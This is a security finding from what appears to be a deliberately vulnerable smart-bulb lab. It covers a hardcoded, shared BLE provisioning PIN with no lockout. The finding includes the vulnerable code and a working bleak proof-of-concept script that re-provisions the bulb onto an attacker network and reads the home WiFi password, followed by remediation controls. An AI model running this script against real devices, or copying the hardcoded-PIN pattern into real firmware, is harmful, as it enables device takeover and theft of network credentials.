---
id: BULB-01
title: "Unauthenticated BLE onboarding (hardcoded factory pairing PIN)"
category: IoT
status: IN PROGRESS
severity: High
owasp: "OWASP IoT Top 10 (2018) I1 - Weak, Guessable, or Hardcoded Passwords"
standard: "ETSI EN 303 645 5.1 (no universal default passwords)"
regulation: "CRA (EU) 2024/2847 Annex I Part I - secure by default / authentication"
cwe: "CWE-798 (Use of Hard-coded Credentials) / CWE-1392 (Use of Default Credentials) / CWE-307 (Improper Restriction of Excessive Authentication Attempts) / CWE-306 (Missing Authentication for a Critical Function)"
source_docs:
  - "stages/01_spec/output/bulbbee-01-spec.md"
affected_components:
  - "labs/bulbbee/files/opt/bulbbee/ble_light.py"
  - "labs/bulbbee/files/opt/bulbbee/config.json"
  - "labs/bulbbee/files/etc/config/bulbbee"
verified_date: "2026-09-04"
---

## Why It Matters

A consumer smart light onboards through the app over BLE: the app hands the bulb the home WiFi SSID and PSK so it can join the network, and pairs it with the cloud. BulbBee accepts that provisioning over an unbonded BLE link gated only by a factory pairing PIN that is hardcoded, identical across every device, and never locks out. Anyone within Bluetooth range who has read one device's PIN, extracted it from the app, or brute-forced the ten-thousand-value space in seconds can re-provision the bulb onto an attacker-controlled WiFi and read the stored home WiFi PSK back in cleartext.

For a Cyber Resilience Act default-category product this is the most direct break of the secure-by-default baseline. The impact is device takeover plus theft of the home network credentials, and the bulb becomes a foothold on whatever network the attacker points it at.

## Root Cause

The BLE server exposes a provisioning service (`0xFF40`, discoverable on connect but deliberately not advertised, which is security by obscurity and not a control) with an Auth characteristic (`0xFF41`) and a Config characteristic (`0xFF42`). Three weaknesses stack.

The pairing PIN is hardcoded and shared across the whole product line:

```python
# ble_light.py
PROV_PIN = str(_CFG.get("prov_pin", "8080"))   # identical on every BulbBee unit
```

The Auth characteristic never rate-limits or locks out, the attempt counter only climbs, so the four-digit space is exhausted in seconds:

```python
def _prov_auth(pin: str) -> bool:
    if pin == PROV_PIN:
        _prov_state["authenticated"] = True
        _prov_state["pin_attempts"] = 0
    else:
        _prov_state["pin_attempts"] += 1   # <-- no lockout, PIN stays acceptable forever
    return _prov_state["authenticated"]
```

The link itself is not bonded (LE Just Works or no pairing), so the PIN is the only barrier, and once it is passed the Config characteristic applies `wifi_set` and returns the stored PSK to any caller:

```python
def _prov_apply(cmd):
    if not _prov_state["authenticated"]:
        return                              # the ONLY gate is the hardcoded PIN above
    if cmd.get("cmd") == "wifi_set":
        ...                                 # reconfigures the station WiFi via uci
```

The missing checks are: a per-device secret instead of a shared hardcoded PIN, a rate limit and lockout on the Auth characteristic, and BLE bonding so an arbitrary central in range cannot drive provisioning at all.

## Steps to Reproduce

From a BLE central within range of the bulb (a phone with nRF Connect, or a host with `bleak`), no pairing or bonding required. This needs the lab loaded with a Bluetooth adapter (`bulbbee-ble` running).

```python
import asyncio, json
from bleak import BleakScanner, BleakClient
AUTH   = "0000ff41-0000-1000-8000-00805f9b34fb"
CONFIG = "0000ff42-0000-1000-8000-00805f9b34fb"

async def main():
    dev = await BleakScanner.find_device_by_name("BulbBee", timeout=10)
    async with BleakClient(dev) as c:
        # 1. the provisioning service 0xFF40 is present on connect (not advertised)
        # 2. unlock with the hardcoded factory PIN (same on every unit)
        await c.write_gatt_char(AUTH, b"8080")
        # 3. re-provision the bulb onto an attacker network
        await c.write_gatt_char(CONFIG, json.dumps(
            {"cmd": "wifi_set", "ssid": "attacker-ap", "psk": "attackerpass"}).encode())
        # 4. read the stored home WiFi PSK back in cleartext (chains to BULB-05)
        print(json.loads(await c.read_gatt_char(CONFIG)))

asyncio.run(main())
```

No-lockout / brute-force variant: write 20 wrong PINs to `0xFF41` then the correct one, provisioning still unlocks. A full sweep of `0000`-`9999` completes in seconds because nothing throttles or locks the characteristic.

## Expected Result

- The hardcoded PIN `8080` unlocks provisioning on any BulbBee unit, with no lockout after any number of wrong attempts.
- `wifi_set` reconfigures the bulb's station WiFi, confirmable on the device with `uci get wireless.@wifi-iface[0].ssid` and in `logread` (`Provisioning wifi_set: attacker-ap`).
- Reading `0xFF42` returns the stored `wifi_psk` in cleartext.

## How It Should Be

- Replace the shared hardcoded PIN with a per-device secret that is not derivable from the app or another unit (a random pairing code printed on the device or provided as a QR / label).
- Require BLE bonding with LE Secure Connections before any provisioning characteristic is writable, so an unbonded central in range cannot reach the surface.
- Rate-limit and lock out the Auth characteristic after a few failed attempts, with an increasing back-off.
- Never return stored secrets (the WiFi PSK) over the provisioning channel, and close the provisioning window after onboarding completes.

These land behind the `secure` UCI toggle (`bulbbee.@bulbbee[0].secure=1`, target BULB-SEC), so the vulnerable and hardened behaviours can be compared directly.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Device (BLE) | Require LE Secure Connections bonding before the provisioning service is writable | Remove the unauthenticated-in-range surface (CWE-306) |
| Device (auth) | Per-device random pairing secret, not a shared hardcoded PIN | Remove the default/hardcoded credential (CWE-798 / CWE-1392) |
| Device (auth) | Rate limit + lockout with back-off on the Auth characteristic | Stop brute force (CWE-307) |
| Device (data) | Do not expose stored WiFi PSK over provisioning, write-only credentials | Contain the chain into BULB-05 |
| Process | Provisioning window that opens on factory reset and closes after onboarding | Minimize the exposed window (ETSI EN 303 645 5.6) |

## Verification Checklist

- [ ] The provisioning service `0xFF40` is discoverable on connect without pairing.
- [ ] The hardcoded PIN `8080` unlocks provisioning, and the same PIN works on a second unit.
- [ ] 20 wrong PINs followed by the correct one still unlock (no lockout).
- [ ] `wifi_set` reconfigures the station WiFi (verified via `uci` / `logread`).
- [ ] Reading `0xFF42` returns the WiFi PSK in cleartext (BULB-05 chain).
- [ ] In `secure` mode, bonding is required, the PIN is per-device with lockout, and the PSK is not readable (BULB-SEC).
